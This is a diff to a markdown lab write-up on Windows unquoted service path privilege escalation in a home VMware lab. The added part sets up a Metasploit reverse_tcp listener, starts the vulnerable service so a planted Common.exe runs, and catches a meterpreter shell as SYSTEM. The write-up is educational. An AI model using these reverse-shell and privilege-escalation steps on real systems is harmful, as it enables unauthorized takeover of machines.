@@ -53,7 +53,7 @@ It stops at the first one it finds. So if I drop a file called Common.exe inside
 | **Attacker Machine** | Kali Linux               |
 | **Attacker IP**      | 192.168.5.128            |
 | **Victim Machine**   | Windows 10               |
-| **Victim IP**        | 192.168.5.129            |
+| **Victim IP**        | 192.168.5.144            |
 | **Network**          | VMware Host-Only Network |
 | **Domain**           | WORKGROUP                |
 ```
@@ -139,12 +139,12 @@ SERVICE_NAME: unquotedsvc
         SERVICE_START_NAME : LocalSystem
 ```
 
-```markdown
+
 | **Field** | **Value** | **What it Means** |
 |:---------|:----------|:------------------|
 | **BINARY_PATH_NAME** | `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe` | The service executable path is **not enclosed in quotation marks**, making it vulnerable to an **Unquoted Service Path** attack. |
 | **SERVICE_START_NAME** | `LocalSystem` | The service runs under the **LocalSystem (SYSTEM)** account, so successful exploitation results in **SYSTEM-level privileges**. |
-```
+
 
 ## Checked Write Permissions on C:\
 
@@ -275,3 +275,88 @@ copy C:\PrivEsc\rev.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 ```
 1 file(s) copied.
 ```
+<p align="center">
+  <img src="images/step4-1.png" width="600">
+</p>
+
+Started the Metasploit Listener on Kali
+
+```bash
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.5.128
+set lport 4444
+run
+```
+**Output:**
+
+```
+msfconsole -q                                                                                   
+msf > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost 192.168.5.128
+lhost => 192.168.5.128
+msf exploit(multi/handler) > set lport 4444
+lport => 4444
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.5.128:4444 
+```
+<p align="center">
+  <img src="images/step4-2.png" width="600">
+</p>
+
+Started the Service on the Victim
+
+```bash
+C:\PrivEsc> net start unquotedsvc
+```
+Windows started the service, looked for the binary, found `Common.exe` first in the writable folder, and ran it as `SYSTEM`.
+
+## Step 5 — Getting a SYSTEM Shell
+
+Metasploit Caught the Connection
+
+```
+[*] Sending stage (244806 bytes) to 192.168.5.144
+[*] Meterpreter session 2 opened (192.168.5.128:4444 -> 192.168.5.144:50097) at 2026-06-20 23:47:53 -0400
+
+meterpreter >
+```
+<p align="center">
+  <img src="images/step5-1.png" width="600">
+</p>
+
+Dropped into a Shell and Checked Privileges
+
+```bash
+meterpreter > shell
+```
+**Output:**
+
+```
+Process 7880 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19045.2965]
+(c) Microsoft Corporation. All rights reserved.
+```
+<p align="center">
+  <img src="images/step5-2.png" width="600">
+</p>
+
+```bash
+C:\PrivEsc>whoami
+```
+**Output:**
+
+```
+nt authority\system
+```
+
+<p align="center">
+  <img src="images/step5-3.png" width="600">
+</p>
+
+I went from a normal low privilege user to `nt authority\system` just by dropping a file into a writable folder and starting a service.
